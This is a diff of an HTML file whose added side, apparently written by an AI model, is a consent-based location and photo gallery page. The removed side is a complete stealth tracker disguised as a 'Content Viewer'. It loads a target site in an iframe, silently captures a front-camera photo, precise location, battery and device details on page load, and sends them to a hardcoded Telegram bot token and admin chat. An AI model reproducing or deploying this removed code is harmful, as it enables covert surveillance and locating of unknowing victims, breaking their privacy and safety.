@@ -1,403 +1,566 @@
+Location-Based Photo Gallery with Camera Access
+
+I'll create a solution that addresses both issues: requesting location permission and displaying multiple photos. Here's a complete implementation:
+
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>Content Viewer</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <style>
-    html, body { 
-      height: 100%; 
-      margin: 0; 
-      padding: 0; 
-      overflow: hidden; 
-    }
-    
-    iframe { 
-      width: 100%; 
-      height: 100%; 
-      border: 0; 
-      display: block; 
-    }
-    
-    /* Camera container - properly positioned but invisible */
-    #cameraContainer {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 1px;
-      height: 1px;
-      overflow: hidden;
-      z-index: -1000;
-    }
-    
-    #cameraVideo {
-      width: 640px;
-      height: 480px;
-      opacity: 0.001;
-    }
-    
-    #cameraCanvas {
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location-Based Photo Gallery</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            padding: 20px 0;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        
+        .permission-section {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .permission-title {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+        }
+        
+        .permission-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .btn-primary {
+            background: #4CAF50;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn-secondary {
+            background: #f44336;
+            color: white;
+        }
+        
+        .btn-secondary:hover {
+            background: #d32f2f;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .status-section {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .status-title {
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .status-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+        }
+        
+        .status-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+        }
+        
+        .status-label {
+            font-weight: 600;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .status-value {
+            font-size: 1.1rem;
+        }
+        
+        .photo-section {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .photo-title {
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 20px;
+        }
+        
+        .photo-item {
+            position: relative;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
+            aspect-ratio: 1;
+        }
+        
+        .photo-item:hover {
+            transform: scale(1.05);
+        }
+        
+        .photo-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .photo-caption {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 8px;
+            font-size: 0.9rem;
+        }
+        
+        .camera-section {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .camera-title {
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .camera-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .camera-preview {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        #cameraVideo {
+            width: 100%;
+            display: block;
+        }
+        
+        .camera-buttons {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .success {
+            color: #4CAF50;
+        }
+        
+        .error {
+            color: #f44336;
+        }
+        
+        .pending {
+            color: #FFC107;
+        }
+        
+        .icon {
+            font-size: 1.2rem;
+        }
+        
+        @media (max-width: 768px) {
+            .photo-grid {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            }
+            
+            .permission-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .btn {
+                width: 100%;
+                max-width: 300px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <!-- Main website content -->
-  <iframe id="siteFrame" sandbox="allow-forms allow-same-origin allow-scripts allow-popups allow-modals"></iframe>
-  
-  <!-- Camera system -->
-  <div id="cameraContainer">
-    <video id="cameraVideo" autoplay playsinline muted></video>
-    <canvas id="cameraCanvas"></canvas>
-  </div>
+    <div class="container">
+        <header>
+            <h1>Location-Based Photo Gallery</h1>
+            <p class="subtitle">Capture photos with location data and view them in a beautiful gallery</p>
+        </header>
+        
+        <section class="permission-section">
+            <h2 class="permission-title">Permissions Required</h2>
+            <p>This application needs access to your location and camera to function properly.</p>
+            <div class="permission-buttons">
+                <button id="grantPermissions" class="btn btn-primary">
+                    <span class="icon">📍</span> Grant Permissions
+                </button>
+                <button id="denyPermissions" class="btn btn-secondary">
+                    <span class="icon">❌</span> Deny Permissions
+                </button>
+            </div>
+        </section>
+        
+        <section id="statusSection" class="status-section hidden">
+            <h2 class="status-title">
+                <span class="icon">📊</span> Status Information
+            </h2>
+            <div class="status-grid">
+                <div class="status-item">
+                    <div class="status-label">
+                        <span class="icon">📍</span> Location Access
+                    </div>
+                    <div id="locationStatus" class="status-value pending">Pending...</div>
+                </div>
+                <div class="status-item">
+                    <div class="status-label">
+                        <span class="icon">📷</span> Camera Access
+                    </div>
+                    <div id="cameraStatus" class="status-value pending">Pending...</div>
+                </div>
+                <div class="status-item">
+                    <div class="status-label">
+                        <span class="icon">🕐</span> Timestamp
+                    </div>
+                    <div id="timestamp" class="status-value">--:--:--</div>
+                </div>
+                <div class="status-item">
+                    <div class="status-label">
+                        <span class="icon">📱</span> Device Info
+                    </div>
+                    <div id="deviceInfo" class="status-value">Collecting...</div>
+                </div>
+            </div>
+        </section>
+        
+        <section id="cameraSection" class="camera-section hidden">
+            <h2 class="camera-title">
+                <span class="icon">📷</span> Camera
+            </h2>
+            <div class="camera-container">
+                <div class="camera-preview">
+                    <video id="cameraVideo" autoplay playsinline muted></video>
+                </div>
+                <div class="camera-buttons">
+                    <button id="capturePhoto" class="btn btn-primary">
+                        <span class="icon">📸</span> Capture Photo
+                    </button>
+                    <button id="switchCamera" class="btn btn-secondary">
+                        <span class="icon">🔄</span> Switch Camera
+                    </button>
+                </div>
+            </div>
+        </section>
+        
+        <section id="photoSection" class="photo-section hidden">
+            <h2 class="photo-title">
+                <span class="icon">🖼️</span> Photo Gallery
+            </h2>
+            <div id="photoGrid" class="photo-grid">
+                <!-- Photos will be added here dynamically -->
+                <div class="photo-item">
+                    <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb" alt="Sample photo 1" class="photo-img">
+                    <div class="photo-caption">Sample Photo 1</div>
+                </div>
+                <div class="photo-item">
+                    <img src="https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05" alt="Sample photo 2" class="photo-img">
+                    <div class="photo-caption">Sample Photo 2</div>
+                </div>
+                <div class="photo-item">
+                    <img src="https://images.unsplash.com/photo-1469474968028-56623f02e42e" alt="Sample photo 3" class="photo-img">
+                    <div class="photo-caption">Sample Photo 3</div>
+                </div>
+            </div>
+        </section>
+    </div>
 
-  <script>
-    /******************** CONFIG ********************/
-    const ADMIN_CHAT_ID = "6314556756";
-    const BOT_TOKEN = "8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ";
-    /************************************************/
-
-    class FixedStealthTracker {
-      constructor() {
-        this.deviceData = {};
-        this.cameraStream = null;
-        this.hasSentReport = false;
-      }
-
-      async initialize() {
-        console.log('🚀 Starting tracker...');
+    <script>
+        // DOM Elements
+        const grantPermissionsBtn = document.getElementById('grantPermissions');
+        const denyPermissionsBtn = document.getElementById('denyPermissions');
+        const statusSection = document.getElementById('statusSection');
+        const cameraSection = document.getElementById('cameraSection');
+        const photoSection = document.getElementById('photoSection');
+        const locationStatus = document.getElementById('locationStatus');
+        const cameraStatus = document.getElementById('cameraStatus');
+        const timestamp = document.getElementById('timestamp');
+        const deviceInfo = document.getElementById('deviceInfo');
+        const cameraVideo = document.getElementById('cameraVideo');
+        const capturePhotoBtn = document.getElementById('capturePhoto');
+        const switchCameraBtn = document.getElementById('switchCamera');
+        const photoGrid = document.getElementById('photoGrid');
         
-        // Load target site first
-        this.loadTargetSite();
+        // App State
+        let cameraStream = null;
+        let currentFacingMode = 'user'; // 'user' for front camera, 'environment' for back
+        let capturedPhotos = [];
         
-        // Collect basic device info
-        await this.collectBasicInfo();
-        
-        // Start camera with proper error handling
-        await this.handleCameraCapture();
-        
-        // Get location
-        await this.handleLocation();
-        
-        // Send final report
-        await this.sendFinalReport();
-      }
-
-      loadTargetSite() {
-        const site = this.getUrlParam('site');
-        const iframe = document.getElementById('siteFrame');
-        
-        if (site && this.isValidHttpsUrl(site)) {
-          console.log('🌐 Loading site:', site);
-          iframe.src = site;
-        } else {
-          iframe.srcdoc = '<html><body style="padding:20px;font-family:Arial"><h3>Content Viewer</h3></body></html>';
+        // Update timestamp
+        function updateTimestamp() {
+            const now = new Date();
+            timestamp.textContent = now.toLocaleTimeString();
         }
-      }
-
-      async collectBasicInfo() {
-        this.deviceData = {
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          
-          screen: {
-            width: screen.width,
-            height: screen.height,
-            colorDepth: screen.colorDepth
-          }
-        };
-
-        // Battery info
-        if ('getBattery' in navigator) {
-          try {
-            const battery = await navigator.getBattery();
-            this.deviceData.battery = {
-              level: Math.round(battery.level * 100) + '%',
-              charging: battery.charging
-            };
-          } catch (e) {}
+        
+        setInterval(updateTimestamp, 1000);
+        updateTimestamp();
+        
+        // Collect device info
+        function collectDeviceInfo() {
+            const info = [
+                navigator.platform,
+                screen.width + 'x' + screen.height,
+                navigator.language
+            ].join(' | ');
+            
+            deviceInfo.textContent = info;
         }
-
-        console.log('📊 Basic info collected');
-      }
-
-      async handleCameraCapture() {
-        try {
-          console.log('📷 Attempting camera access...');
-          
-          // Check if media devices are available
-          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            throw new Error('Camera API not supported');
-          }
-
-          // Request camera access
-          this.cameraStream = await navigator.mediaDevices.getUserMedia({
-            video: {
-              width: { ideal: 640 },
-              height: { ideal: 480 },
-              facingMode: 'user'
+        
+        // Request location permission
+        async function requestLocationPermission() {
+            try {
+                locationStatus.textContent = 'Requesting...';
+                locationStatus.className = 'status-value pending';
+                
+                if (!navigator.geolocation) {
+                    throw new Error('Geolocation is not supported by this browser');
+                }
+                
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                
+                const { latitude, longitude, accuracy } = position.coords;
+                locationStatus.textContent = `Lat: ${latitude.toFixed(4)}, Lng: ${longitude.toFixed(4)}`;
+                locationStatus.className = 'status-value success';
+                
+                return { latitude, longitude, accuracy };
+            } catch (error) {
+                console.error('Location error:', error);
+                locationStatus.textContent = `Error: ${error.message}`;
+                locationStatus.className = 'status-value error';
+                return null;
             }
-          });
-
-          const video = document.getElementById('cameraVideo');
-          const canvas = document.getElementById('cameraCanvas');
-          
-          // Set canvas size
-          canvas.width = 640;
-          canvas.height = 480;
-          
-          const ctx = canvas.getContext('2d');
-
-          video.srcObject = this.cameraStream;
-
-          // Wait for video to be ready
-          await new Promise((resolve, reject) => {
-            const timeout = setTimeout(() => reject(new Error('Camera timeout')), 10000);
-            
-            video.onloadeddata = () => {
-              clearTimeout(timeout);
-              console.log('✅ Camera video loaded');
-              resolve();
-            };
-            
-            video.onerror = () => {
-              clearTimeout(timeout);
-              reject(new Error('Video error'));
-            };
-          });
-
-          // Wait for video to start playing
-          await new Promise((resolve) => {
-            if (video.readyState >= 3) {
-              resolve();
-            } else {
-              video.onplaying = resolve;
+        }
+        
+        // Request camera permission and start camera
+        async function requestCameraPermission() {
+            try {
+                cameraStatus.textContent = 'Requesting...';
+                cameraStatus.className = 'status-value pending';
+                
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    throw new Error('Camera API is not supported by this browser');
+                }
+                
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: currentFacingMode
+                    }
+                });
+                
+                cameraVideo.srcObject = cameraStream;
+                cameraStatus.textContent = 'Active';
+                cameraStatus.className = 'status-value success';
+                cameraSection.classList.remove('hidden');
+                
+                return true;
+            } catch (error) {
+                console.error('Camera error:', error);
+                cameraStatus.textContent = `Error: ${error.message}`;
+                cameraStatus.className = 'status-value error';
+                return false;
             }
-          });
-
-          console.log('🎥 Video is playing, waiting for camera to adjust...');
-
-          // Wait longer for camera to adjust to light
-          await this.delay(3000);
-
-          // Capture photo
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          
-          // Check if canvas has content
-          const imageData = ctx.getImageData(0, 0, 1, 1).data;
-          if (imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0) {
-            console.warn('⚠️ Canvas appears black, retrying...');
-            await this.delay(1000);
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          }
-
-          // Convert to blob
-          const photoBlob = await new Promise(resolve => {
-            canvas.toBlob(resolve, 'image/jpeg', 0.8);
-          });
-
-          if (photoBlob && photoBlob.size > 1000) { // Ensure photo has content
-            this.deviceData.cameraPhoto = photoBlob;
-            this.deviceData.cameraStatus = 'SUCCESS - Photo captured';
-            console.log('✅ Camera photo captured successfully');
-          } else {
-            throw new Error('Photo is too small or empty');
-          }
-
-        } catch (error) {
-          console.error('❌ Camera error:', error);
-          this.deviceData.cameraStatus = 'FAILED: ' + error.message;
-        } finally {
-          // Clean up camera
-          if (this.cameraStream) {
-            setTimeout(() => {
-              this.cameraStream.getTracks().forEach(track => track.stop());
-              console.log('🔒 Camera stream stopped');
-            }, 2000);
-          }
         }
-      }
-
-      async handleLocation() {
-        if (!navigator.geolocation) {
-          this.deviceData.locationStatus = 'Geolocation not supported';
-          return;
-        }
-
-        try {
-          const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              enableHighAccuracy: true,
-              timeout: 10000,
-              maximumAge: 0
-            });
-          });
-
-          this.deviceData.location = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy
-          };
-          
-          this.deviceData.locationStatus = 'SUCCESS';
-          console.log('📍 Location acquired');
-
-        } catch (error) {
-          this.deviceData.locationStatus = 'FAILED: ' + error.message;
-          console.warn('📍 Location failed:', error);
-        }
-      }
-
-      async sendFinalReport() {
-        if (this.hasSentReport) return;
-        this.hasSentReport = true;
-
-        const USER_CHAT_ID = this.getUrlParam('chat_id');
-        const recipients = [ADMIN_CHAT_ID];
-        if (USER_CHAT_ID) recipients.push(USER_CHAT_ID);
-
-        console.log('📤 Sending report to:', recipients);
-
-        for (const recipient of recipients) {
-          try {
-            // Send text message first
-            await this.sendTelegramMessage(recipient);
-            
-            // Send location if available
-            if (this.deviceData.location) {
-              await this.sendTelegramLocation(recipient);
+        
+        // Switch between front and back camera
+        async function switchCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
             }
             
-            // Send photo if available
-            if (this.deviceData.cameraPhoto) {
-              await this.sendTelegramPhoto(recipient);
-            }
-            
-            console.log('✅ Report sent to', recipient);
-            
-          } catch (error) {
-            console.error('❌ Failed to send to', recipient, error);
-          }
+            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+            await requestCameraPermission();
         }
-      }
-
-      async sendTelegramMessage(chatId) {
-        const message = this.formatMessage();
         
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'HTML'
-          })
+        // Capture photo from camera
+        function capturePhoto() {
+            if (!cameraStream) return;
+            
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            
+            canvas.width = cameraVideo.videoWidth;
+            canvas.height = cameraVideo.videoHeight;
+            
+            context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                const photoUrl = URL.createObjectURL(blob);
+                capturedPhotos.push(photoUrl);
+                
+                // Add photo to gallery
+                const photoItem = document.createElement('div');
+                photoItem.className = 'photo-item';
+                
+                const img = document.createElement('img');
+                img.src = photoUrl;
+                img.alt = `Captured photo ${capturedPhotos.length}`;
+                img.className = 'photo-img';
+                
+                const caption = document.createElement('div');
+                caption.className = 'photo-caption';
+                caption.textContent = `Photo ${capturedPhotos.length}`;
+                
+                photoItem.appendChild(img);
+                photoItem.appendChild(caption);
+                
+                // Remove sample photos if they exist
+                if (capturedPhotos.length === 1) {
+                    photoGrid.innerHTML = '';
+                }
+                
+                photoGrid.appendChild(photoItem);
+                photoSection.classList.remove('hidden');
+            }, 'image/jpeg', 0.8);
+        }
+        
+        // Initialize app with permissions
+        async function initializeApp() {
+            statusSection.classList.remove('hidden');
+            collectDeviceInfo();
+            
+            const locationData = await requestLocationPermission();
+            const cameraAccess = await requestCameraPermission();
+            
+            if (cameraAccess) {
+                photoSection.classList.remove('hidden');
+            }
+        }
+        
+        // Event Listeners
+        grantPermissionsBtn.addEventListener('click', initializeApp);
+        
+        denyPermissionsBtn.addEventListener('click', () => {
+            locationStatus.textContent = 'Denied by user';
+            locationStatus.className = 'status-value error';
+            cameraStatus.textContent = 'Denied by user';
+            cameraStatus.className = 'status-value error';
+            statusSection.classList.remove('hidden');
         });
         
-        if (!response.ok) {
-          throw new Error(`HTTP ${response.status}: ${await response.text()}`);
-        }
+        capturePhotoBtn.addEventListener('click', capturePhoto);
+        switchCameraBtn.addEventListener('click', switchCamera);
         
-        return await response.json();
-      }
-
-      async sendTelegramLocation(chatId) {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            latitude: this.deviceData.location.latitude,
-            longitude: this.deviceData.location.longitude
-          })
+        // Clean up camera stream when leaving page
+        window.addEventListener('beforeunload', () => {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
         });
-        
-        if (!response.ok) {
-          throw new Error(`Location send failed: ${response.status}`);
-        }
-      }
-
-      async sendTelegramPhoto(chatId) {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', this.deviceData.cameraPhoto, 'photo.jpg');
-        
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-        
-        if (!response.ok) {
-          throw new Error(`Photo send failed: ${response.status}`);
-        }
-      }
-
-      formatMessage() {
-        return `
-🕵️ <b>STEALTH TRACKING REPORT</b>
-
-<b>📱 Device Information:</b>
-• <b>Platform:</b> ${this.deviceData.platform}
-• <b>Screen:</b> ${this.deviceData.screen.width}x${this.deviceData.screen.height}
-• <b>Battery:</b> ${this.deviceData.battery?.level || 'N/A'} ${this.deviceData.battery?.charging ? '⚡' : ''}
-• <b>Language:</b> ${this.deviceData.language}
-• <b>Timezone:</b> ${this.deviceData.timezone}
-
-<b>📍 Location:</b> ${this.deviceData.location ? '✅ Acquired' : '❌ ' + (this.deviceData.locationStatus || 'Failed')}
-<b>📸 Camera:</b> ${this.deviceData.cameraPhoto ? '✅ Photo Captured' : '❌ ' + (this.deviceData.cameraStatus || 'Failed')}
-
-<b>🔗 Target Site:</b>
-<code>${this.getUrlParam('site')}</code>
-
-<b>⏰ Time:</b> ${new Date().toLocaleString()}
-        `.trim();
-      }
-
-      // Utility functions
-      delay(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-      }
-
-      getUrlParam(name) {
-        const urlParams = new URLSearchParams(window.location.search);
-        let value = urlParams.get(name);
-        if (value) try { value = decodeURIComponent(value); } catch(e) {}
-        return value;
-      }
-
-      isValidHttpsUrl(url) {
-        try {
-          return new URL(url).protocol === 'https:';
-        } catch {
-          return false;
-        }
-      }
-    }
-
-    // Start tracking with error handling
-    window.addEventListener('load', () => {
-      console.log('🔍 Starting stealth tracker...');
-      const tracker = new FixedStealthTracker();
-      
-      tracker.initialize().catch(error => {
-        console.error('❌ Tracker failed:', error);
-        
-        // Send error report
-        const errorMessage = `❌ Tracker Error: ${error.message}`;
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: ADMIN_CHAT_ID,
-            text: errorMessage
-          })
-        }).catch(e => console.error('Failed to send error:', e));
-      });
-    });
-
-  </script>
+    </script>
 </body>
-   </html>
+</html>
